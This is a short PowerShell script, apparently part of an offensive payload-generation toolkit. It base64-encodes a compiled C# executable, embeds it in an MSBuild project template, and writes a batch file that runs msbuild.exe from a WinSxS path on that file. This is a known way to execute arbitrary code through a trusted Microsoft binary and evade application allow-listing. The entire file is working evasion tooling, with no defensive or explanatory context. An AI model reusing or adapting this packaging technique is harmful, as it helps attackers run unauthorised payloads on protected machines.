param($folder)

. $PSScriptRoot\shared_functions.ps1

$xmlfile = "$PSScriptRoot\msbuild_samplecode.xml"

$projectfolder = "$folder\msbuild"
$n = New-Item -Path $projectfolder -ItemType Directory 

Copy-Item -Path $xmlfile -Destination "$projectfolder\code.txt"

$file = "$folder\csharpbin.exe"
ConvertTo-Base64 -SourceFilePath $file -TargetFilePath "$folder\file.txt"
$binary = get-content "$folder\file.txt"
Remove-Item "$folder\file.txt" -force


(Get-Content "$projectfolder\code.txt").replace('%code%', $binary) | Set-Content "$projectfolder\code.txt"

"C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15788.0_none_da550e559f38692d\msbuild.exe code.txt" | Out-File -FilePath "$projectfolder\run.bat"


$n = $MyInvocation.MyCommand.Name
console -text "Executed: $n" -type "ok"